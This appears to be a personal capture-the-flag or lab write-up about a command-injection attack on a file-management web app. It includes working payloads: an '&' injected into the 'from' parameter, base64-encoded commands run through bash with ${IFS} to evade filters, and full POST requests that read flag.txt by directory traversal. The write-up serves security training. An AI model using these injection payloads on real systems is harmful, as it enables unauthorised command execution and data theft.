
## getting the injection field


the site has many requests such as copying files to directory

moving the file into folder

advanced search

test all the parameters with the cheatsheet

>[!hint]
>if u see malicious payload u are on the right track :)

#### Obfuscating and evading

i found out thhat we get the command error from abusing the from field
and usiong %26 which is the & character 

i then base64 encoded the payload and used bash to execute it on the bakcend


```shell
echo -n 'whoami' | base64
```


the full header for pwd

```header
POST /index.php?to=&from=%26bash<<<$(base64${IFS}-d<<<cHdk)%26&finish=1&move=1 HTTP/1.1
```

i then ls the root folder by direcotry traversla

```shell
 echo -n 'ls ../../../../' |base64
 bHMgLi4vLi4vLi4vLi4v
 
```

we cann see that the flag.txt is located in root
and we can just swap the ls from our previos command to cat 

```shell
echo -n 'cat ../../../../flag.txt' |base64
Y2F0IC4uLy4uLy4uLy4uL2ZsYWcudHh0
```

final header looks like this 

``` POST
POST /index.php?to=&from=%26bash<<<$(base64${IFS}-d<<<Y2F0IC4uLy4uLy4uLy4uL2ZsYWcudHh0)%26&finish=1&move=1 HTTP/1.1
```

![[Pasted image 20250225122545.png]]
